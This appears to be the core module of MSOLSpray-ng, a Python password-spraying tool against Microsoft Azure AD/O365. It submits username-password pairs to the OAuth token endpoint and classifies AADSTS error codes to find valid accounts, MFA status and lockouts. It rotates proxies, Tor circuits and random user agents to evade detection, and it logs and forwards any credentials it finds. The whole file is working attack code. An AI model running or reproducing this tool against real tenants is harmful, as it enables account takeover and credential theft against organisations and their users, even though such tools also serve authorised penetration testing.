import argparse
import time
from math import trunc
from random import randrange, shuffle
from typing import List

import requests
from fake_useragent import UserAgent

from msolspray.enum import AuthResult
from msolspray.tor import generate_tor_circuits_urls
from msolspray.notify import notify
from msolspray.utils import (
    print_debug,
    print_error,
    print_info,
    print_success,
    print_warning,
)


def try_login(
    url: str,
    username: str,
    password: str,
    args: argparse.Namespace,
    start_time: str,
    retries: int = 3,
    proxies=None,
):
    issued = False

    while not issued and retries > 0:
        try:
            r = _try_login(
                url,
                username,
                password,
                args,
                proxies=proxies,
            )
        except Exception as e:
            retries -= 1
            if retries == 0:
                print_error(f"Error: {e}")
        else:
            issued = True
    if not issued:
        with open(start_time + "_untested.txt", "a", encoding="utf-8") as untested_file:
            untested_file.write(f"{username}:{password}\n")
        return None
    return r


def _try_login(
    url: str,
    username: str,
    password: str,
    args: argparse.Namespace,
    proxies=None,
) -> requests.Response:
    body = {
        "resource": "https://graph.windows.net",
        # (see https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/how-to-retrieve-an-azure-ad-bulk-token-with-powershell/ba-p/2944894)
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # MS Graph API client id
        "client_info": "1",
        "grant_type": "password",
        "username": username,
        "password": password,
        "scope": "openid",
    }

    headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    # include custom headers
    if args.headers:
        for header in args.headers:
            h, v = header.split(":", 1)
            headers[h.strip()] = v.strip()
    # set user-agent
    if args.rua:
        ua = UserAgent(fallback=args.user_agent)  # avoid exception with fallback
        headers["User-Agent"] = ua.random
    else:
        headers["User-Agent"] = args.user_agent

    r = requests.post(
        f"{url}/common/oauth2/token",
        headers=headers,
        data=body,
        proxies=proxies,
        verify=False,
        timeout=args.timeout,
    )
    return r


def remove_credential(credentials: List[str], cred: str, separator: str):
    """Remove a credential and other credentials with the same username but different password.

    Args:
        credentials (List[str]): List of credentials in the format 'username<separator>password'
        cred (str): Credential to be removed
        separator (str): Separator used in the credentials

    Returns:
        None: The function modifies the credentials list in place.
    """
    username = cred.split(separator)[0]
    if cred in credentials:
        try:
            credentials.remove(cred)
        except:
            pass
    # remove other credentials with same username but different password
    for curr in credentials:
        if curr.startswith(username + separator):
            try:
                credentials.remove(curr)
            except:
                pass


def post_processing(username, password, auth_result, credentials, args) -> dict:
    """Handle post-processing based on the authentication result.

    Args:
        username (str): The username used in the authentication attempt.
        password (str): The password used in the authentication attempt.
        auth_result (AuthResult): The result of the authentication attempt.
        args (argparse.Namespace): Parsed command-line arguments.

    Returns:
        dict
    """
    msg = ""
    cred_msg = ""
    is_valid = False
    should_remove = False
    if auth_result == AuthResult.SUCCESS:
        cred_msg = f"{username}:{password}"
        is_valid = True
        should_remove = True

    elif auth_result == AuthResult.INVALID_PASSWORD:
        pass

    elif auth_result == AuthResult.TENANT_NOT_FOUND:
        if args.auto_remove > 0:
            should_remove = True

    elif auth_result == AuthResult.USER_NOT_FOUND:
        if args.auto_remove > 0:
            should_remove = True

    elif auth_result == AuthResult.MFA_ENABLED:
        cred_msg = f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use."
        is_valid = True
        should_remove = True

    elif auth_result == AuthResult.CONDITIONAL_ACCESS:
        cred_msg = f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
        is_valid = True
        should_remove = True

    elif auth_result == AuthResult.CONDITIONAL_ACCESS_DUO:
        cred_msg = (
            f"{username}:{password} - NOTE: The response indicates conditional access "
            "(MFA: DUO or other) is in use."
        )
        is_valid = True
        should_remove = True

    elif auth_result == AuthResult.ACCOUNT_LOCKED:
        if args.auto_remove > 1:
            should_remove = True

    elif auth_result == AuthResult.ACCOUNT_DISABLED:
        if args.auto_remove > 0:
            should_remove = True

    elif auth_result == AuthResult.PASSWORD_EXPIRED:
        cred_msg = f"{username}:{password} - NOTE: The user's password is expired."
        is_valid = True
        should_remove = True

    elif auth_result == AuthResult.APPLICATION_NOT_FOUND:
        cred_msg = f"{username}:{password} - NOTE: The application was not found."
        is_valid = True
        should_remove = True

    elif auth_result == AuthResult.EXTERNAL_AUTH:
        pass

    elif auth_result == AuthResult.OTHER_FAILURE:
        pass

    if is_valid:
        # Write result to file
        with open(args.out, "a", encoding="utf-8") as f:
            f.write(cred_msg + "\n")
        if args.notify and not args.notify_each:
            msg = "Found valid credentials! (-.^)\n\n"
            msg += cred_msg
            notify(args.notify, msg)

    if should_remove:
        if args.verbose:
            print_debug(f"Removing credential {username}{args.sep}{password} from list")
        remove_credential(credentials, f"{username}{args.sep}{password}", args.sep)

    return {"cred_msg": cred_msg, "should_remove": should_remove}


def parse_response(username, password, error, verbose) -> AuthResult:
    if "AADSTS50126" in error:
        if verbose:
            print_debug(
                f"Invalid username or password. Username: {username} could exist."
            )
        return AuthResult.INVALID_PASSWORD

    if "AADSTS50128" in error or "AADSTS50059" in error:
        print_warning(
            f"Tenant for account {username} doesn't exist. "
            + "Check the domain to make sure they are using Azure/O365 services."
        )
        return AuthResult.TENANT_NOT_FOUND

    if "AADSTS50034" in error:
        print_warning(f"The user {username} doesn't exist.")
        return AuthResult.USER_NOT_FOUND

    if "AADSTS50079" in error or "AADSTS50076" in error:
        # Microsoft MFA response
        print_success(
            f"{username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use."
        )
        return AuthResult.MFA_ENABLED

    if "AADSTS50158" in error:
        # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
        print_success(
            f"{username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
        )
        return AuthResult.CONDITIONAL_ACCESS_DUO

    if "AADSTS50053" in error:
        # Locked out account or Smart Lockout in place
        print_warning(f"The account {username} appears to be locked.")
        return AuthResult.ACCOUNT_LOCKED

    if "AADSTS50057" in error:
        # Disabled account
        print_warning(f"The account {username} appears to be disabled.")
        return AuthResult.ACCOUNT_DISABLED

    if "AADSTS50055" in error:
        # User password is expired
        print_success(
            f"{username} : {password} - NOTE: The user's password is expired."
        )
        return AuthResult.PASSWORD_EXPIRED

    if "AADSTS700016" in error:
        # Application not found in directory (probably because random-generated
        # uuid is being used)
        print_success(
            f"SUCCESS! {username} : {password} - NOTE: The application was not found."
        )
        return AuthResult.APPLICATION_NOT_FOUND

    if "AADSTS50056" in error:
        # Invalid or null password: password doesn't exist in the directory for this user.
        # The user should be asked to enter their password again.
        print_warning(
            "It looks like tenant is using external authentication method (e.g. Okta)."
        )
        return AuthResult.EXTERNAL_AUTH

    if "AADSTS53003" in error:
        # Access has been blocked by Conditional Access policies. The
        # access policy does not allow token issuance.
        print_success(
            f"{username} : {password} - NOTE: Access blocked by Conditional Access policies."
        )
        return AuthResult.CONDITIONAL_ACCESS

    return AuthResult.OTHER_FAILURE


def try_all_credentials(
    credentials: List[str], args: argparse.Namespace, iteration: int = 0
) -> List[str]:
    interrupt = False
    start_time = time.strftime("%Y%m%d%H%M%S")
    results_list = []
    creds_counter = 0
    creds_count = len(credentials)
    lockout_question = False
    lockout_max = trunc((args.max_lockout / 100) * creds_count)
    lockout_counter = 0
    users_to_remove = []

    proxy_list = None
    if args.proxy:
        proxy_list = [
            {
                "http": args.proxy,
                "https": args.proxy,
            }
        ]
    if args.tor:
        socks_list = generate_tor_circuits_urls(args.socks_port, args.tor_pool)
        proxy_list = [{"http": s, "https": s} for s in socks_list]
        if args.verbose:
            print_debug(f"Using {len(proxy_list)} Tor circuits.")

    print_info(f"There are {creds_count} credentials in total to try.")
    print_info(f"Current date and time: {time.ctime()}")

    if args.shuffle:
        shuffle(credentials)

    for cindex, cred in enumerate(credentials):
        if interrupt:
            break

        if creds_counter > 0 and args.sleep > 0:
            time.sleep(args.sleep + args.sleep * (randrange(args.jitter) / 100))

        creds_counter += 1
        print(f"{creds_counter} of {creds_count} credentials tested", end="\r")

        username, password = cred.split(args.sep, 1)

        # rotate over URLs
        url = args.url[cindex % len(args.url)]

        # rotate over proxies if available
        proxies = None
        if proxy_list:
            proxies = proxy_list[cindex % len(proxy_list)]
            if args.verbose:
                print_debug(f"Using proxy {proxies['http']} for this request")

        r = try_login(
            url, username, password, args, start_time, retries=3, proxies=proxies
        )

        if r is None:
            print_error(f"{username}:{password} Error during request")
            continue

        if r.status_code == 200:
            print_success(f"SUCCESS! {username} : {password}")
            _ = post_processing(
                username,
                password,
                AuthResult.SUCCESS,
                credentials,
                args,
            )
            results_list.append(f"{username}:{password}")
            users_to_remove.append(username)
        else:
            resp = r.json()
            error = resp["error_description"]
            status = parse_response(username, password, error, args.verbose)

            if status == AuthResult.ACCOUNT_LOCKED:
                lockout_counter += 1
            elif status == AuthResult.OTHER_FAILURE:
                # Unknown errors
                print_warning(f"Got an error we haven't seen yet for credential {cred}")
                print_warning(error)
                # Log unknown errors for late analysis
                with open("unknown_codes.log", "a", encoding="utf-8") as f:
                    f.write(f"Got an error we haven't seen yet for credential {cred}")
                    f.write(f"{error}\n")

            result = post_processing(
                username,
                password,
                status,
                credentials,
                args,
            )
            if (cred_msg := result["cred_msg"]) != "":
                results_list.append(cred_msg)
            if result["should_remove"]:
                users_to_remove.append(username)

            # If the force flag isn't set and lockout count passed the limit we'll ask
            # if the user is sure they want to keep spraying
            if (
                not args.force
                and not (args.force_first and iteration == 0)
                and lockout_counter > 0
                and lockout_counter >= lockout_max
                and lockout_question is False
            ):
                print_warning("Multiple Account Lockouts Detected!")
                print_warning(
                    f"{lockout_counter} of the accounts you sprayed appear to be locked out. "
                    + "Do you want to continue this spray?"
                )
                if args.notify_actions:
                    notify(
                        args.notify_actions,
                        "[MSOLSpray-ng] Multiple account lockouts detected! Waiting for "
                        + "user interaction...",
                    )
                yes = {"yes", "y"}
                no = {"no", "n", ""}
                lockout_question = True
                choice = "X"
                while choice not in no and choice not in yes:
                    choice = input("[Y/N] (default is N): ").lower()

                if choice in no:
                    print_info("Cancelling the password spray.")
                    print_info(
                        "NOTE: If you are seeing multiple 'account is locked' messages after "
                        + "your first 10 attempts or so this may indicate Azure AD Smart "
                        + "Lockout is enabled."
                    )
                    interrupt = True
                    break
                # else: continue even though lockout is detected

    if len(results_list) > 0:
        print_info(f"Results have been written to {args.out}.")
        if args.notify:
            msg = "Found valid credentials! (-.^)\n\n"
            msg += "\n".join(results_list)
            notify(args.notify, msg)
        results_list.clear()

    return users_to_remove
